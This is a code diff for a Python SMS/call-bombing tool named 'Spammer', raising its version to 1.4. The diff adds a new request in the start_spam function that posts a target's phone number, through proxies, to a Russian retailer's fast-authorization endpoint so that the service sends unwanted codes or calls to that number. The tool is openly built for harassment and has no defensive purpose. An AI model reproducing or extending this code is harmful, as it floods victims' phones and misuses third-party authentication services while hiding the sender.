@@ -17,7 +17,7 @@ def banner():
     print(r" / __| _ \/_\ |  \/  |  \/  | __| _ \ ")
     print(r" \__ \  _/ _ \| |\/| | |\/| | _||   / ")
     print(r" |___/_|/_/ \_\_|  |_|_|  |_|___|_|_\ ")
-    print(r"                           version 1.3")
+    print(r"                           version 1.4")
     print(r"     Spammer: github.com/Flazers      ")
     print(RESET_ALL)
 
@@ -936,7 +936,13 @@ def start_spam(phone, proxies):
         except:
             pass
             print(f"{BRIGHT}{RED} fail")
-
+        try:
+            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
+            post("https://www.dns-shop.ru/auth/auth/fast-authorization/", json={"FastAuthorizationLoginLoadForm[login]": formatted_phone,"FastAuthorizationLoginLoadForm[token]": "", "FastAuthorizationLoginLoadForm[isPhoneCall]:": 1}, headers=headers, proxies=proxies)
+            print(f"{BRIGHT}{GREEN} success")
+        except:
+            pass
+            print(f"{BRIGHT}{RED} fail")
 
 def parse_phone(phone):
     if phone in ["", " "]:
@@ -971,7 +977,7 @@ def check_internet():
 
 
 def check_version():
-    version = "1.3"
+    version = "1.4"
     if float(version) < float(get("https://raw.githubusercontent.com/Flazers/spammer/master/version.txt").text):
         print(f"\n{BRIGHT}{RED}[*] Версия устарела и нуждается в обновлении!{RESET_ALL}")
         sleep(1)
